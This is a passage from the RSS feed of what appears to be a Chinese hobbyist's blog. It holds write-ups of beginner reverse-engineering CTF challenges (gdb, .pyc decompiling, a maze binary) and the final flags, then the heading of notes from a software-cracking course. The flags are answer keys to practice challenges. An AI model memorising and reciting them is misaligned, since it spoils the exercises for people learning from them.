	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010800-573591045_hu17319160698267388137.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215010800-573591045_hu4356549310349919706.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;111&#34;
		data-flex-basis=&#34;268px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;有个叫decrypt的函数，看起来像是加密函数，去gdb里下个断点看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215011038-1672786927.png&#34;
	width=&#34;514&#34;
	height=&#34;130&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215011038-1672786927_hu10588877512116578564.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215011038-1672786927_hu66330289043117042.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;395&#34;
		data-flex-basis=&#34;948px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;r运行，n单步走。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215011406-454661810.png&#34;
	width=&#34;533&#34;
	height=&#34;492&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215011406-454661810_hu10488513551751072888.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215011406-454661810_hu954423439451009888.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;108&#34;
		data-flex-basis=&#34;260px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;中间那一大坨大概是没设置好，现学gdb怎么用先不管了。&lt;/p&gt;
&lt;p&gt;查内存找字符串，&lt;/p&gt;
&lt;p&gt;加密好的东西放进了寄存器eax里：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215011797-1256265585.png&#34;
	width=&#34;538&#34;
	height=&#34;143&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215011797-1256265585_hu6252092119591148933.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215011797-1256265585_hu5666019987353875337.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;376&#34;
		data-flex-basis=&#34;902px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;翻翻寄存器里的东西，找到第一个0x00结尾的是字符串的结尾。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215012095-1579571095.png&#34;
	width=&#34;534&#34;
	height=&#34;365&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215012095-1579571095_hu7516344209771279924.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215012095-1579571095_hu254875115539439943.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;146&#34;
		data-flex-basis=&#34;351px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;x:就是用来查看内存中数值的，后面的200代表查看多少个，wx代表是以word字节查看看，$eax代表的eax寄存器中的值&lt;/p&gt;
&lt;p&gt;在这里我们看到0x00000000，这就证明这个字符串结束了，因为，在C中，代表字符串结尾的就是&amp;quot;\0&amp;quot;,那么前面的就是经过decrypt函数生成的falg&lt;/p&gt;
&lt;p&gt;C：按字符格式显示，把这些十六进制的换成好看一点的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215012467-137796143.png&#34;
	width=&#34;576&#34;
	height=&#34;245&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215012467-137796143_hu1569618312279722807.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215012467-137796143_hu754529829310691937.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;235&#34;
		data-flex-basis=&#34;564px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;python-trade&#34;&gt;python-trade：
&lt;/h1&gt;&lt;p&gt;Pyc文件，网页反编译一下：https://tool.lu/pyc/&lt;/p&gt;
&lt;p&gt;。&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215012802-1394148728.png&#34;
	width=&#34;540&#34;
	height=&#34;549&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215012802-1394148728_hu3417418066241381844.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215012802-1394148728_hu8179378537061129896.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;98&#34;
		data-flex-basis=&#34;236px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013079-1835085025.jpg&#34;
	width=&#34;764&#34;
	height=&#34;418&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013079-1835085025_hu13554127187593124460.jpg 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013079-1835085025_hu10226696178501995579.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;182&#34;
		data-flex-basis=&#34;438px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;翻译翻译，这堆字母让我们输入一串字符串，然后经过encode函数一系列操作之后和correct比较，正确了就算是输对了flag。&lt;/p&gt;
&lt;p&gt;那咱们就反其道而行之。&lt;/p&gt;
&lt;p&gt;先给他把correct给base64解密了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013293-855770514.png&#34;
	width=&#34;474&#34;
	height=&#34;281&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013293-855770514_hu16895134321723218967.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013293-855770514_hu5836849103790427029.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;168&#34;
		data-flex-basis=&#34;404px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;完事了之后在逆着走一遍。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013545-1695020831.png&#34;
	width=&#34;576&#34;
	height=&#34;303&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013545-1695020831_hu13126084811641132096.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013545-1695020831_hu6718942408621952123.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;190&#34;
		data-flex-basis=&#34;456px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013791-679408725.png&#34;
	width=&#34;576&#34;
	height=&#34;328&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013791-679408725_hu10617145824314544584.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013791-679408725_hu3118097030792440639.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;175&#34;
		data-flex-basis=&#34;421px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013987-932579790.jpg&#34;
	width=&#34;248&#34;
	height=&#34;155&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013987-932579790_hu13034438820117442555.jpg 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215013987-932579790_hu9217738665973984084.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;160&#34;
		data-flex-basis=&#34;384px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;再次被自己菜哭，我觉得没啥问题咋就不给我过？&lt;/p&gt;
&lt;p&gt;又上网查了查，去评论转了一圈，发现有人说可能是base64解码的问题，我用的网页解码，不应该有差才对的，怪事。&lt;/p&gt;
&lt;p&gt;补上了几个字符然后过了，正确的是这个：&lt;strong&gt;nctf{d3c0mpil1n9_PyC}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;maze&#34;&gt;Maze
&lt;/h1&gt;&lt;p&gt;题目给的叫迷宫，运行了一下也没啥东西，扔进ida看看：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014212-580978843.png&#34;
	width=&#34;458&#34;
	height=&#34;542&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014212-580978843_hu10362879407846097812.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014212-580978843_hu1949263495227069470.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;84&#34;
		data-flex-basis=&#34;202px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;看起来像是四个字符：0oO.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014489-1369557358.png&#34;
	width=&#34;576&#34;
	height=&#34;246&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014489-1369557358_hu17417801817047736191.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014489-1369557358_hu11029364021673160839.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;234&#34;
		data-flex-basis=&#34;561px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;其实在IDA里把光标选择ASCII码按R键就可以把ASCII码变成字符了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014748-1879100391.png&#34;
	width=&#34;406&#34;
	height=&#34;397&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014748-1879100391_hu4018247625648215256.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014748-1879100391_hu15078218259765171779.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;102&#34;
		data-flex-basis=&#34;245px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后这几个是坐标移动&lt;/p&gt;
&lt;p&gt;v9是一个二维数组，用来控制上下和左右这两种方向的。&lt;/p&gt;
&lt;p&gt;两种可能：&lt;/p&gt;
&lt;p&gt;1.v9代表横向、&amp;amp;v9+1代表竖向&lt;/p&gt;
&lt;p&gt;2.v9代表竖向、&amp;amp;v9+1代表横向&lt;/p&gt;
&lt;p&gt;反正是诶个试过去了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014966-1906576171.png&#34;
	width=&#34;99&#34;
	height=&#34;156&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014966-1906576171_hu8097765979553050656.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215014966-1906576171_hu407528693463822770.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;63&#34;
		data-flex-basis=&#34;152px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;从左上角到#，经历→↓→→↓↓←↓↓↓→→→→↑↑←←，转换为o0oo00O000oooo..OO&lt;/p&gt;
&lt;p&gt;Flag：nctf{o0oo00O000oooo..OO}&lt;/p&gt;
&lt;p&gt;好像是南邮的题吧&amp;hellip;真厉害。&lt;/p&gt;
&lt;p&gt;还剩一个比较难搞，明天继续。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215015207-925161360.png&#34;
	width=&#34;577&#34;
	height=&#34;132&#34;
	srcset=&#34;https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215015207-925161360_hu18085419111323967456.png 480w, https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/1858293-20200201215015207-925161360_hu3333432469349411554.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;437&#34;
		data-flex-basis=&#34;1049px&#34;
	
&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>吾爱破解培训第一课个人笔记</title>
        <link>https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</link>
        <pubDate>Fri, 31 Jan 2020 10:38:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</guid>
        <description>&lt;p&gt;**【个人笔记】 **&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;《吾爱&lt;a class=&#34;link&#34; href=&#34;https://www.52pojie.cn&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;破解&lt;/a&gt;培训第一课：破解基础知识之介绍常见工具和壳的特征》讲师：Hmily&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;0x00 前提&lt;/strong&gt;&lt;/p&gt;
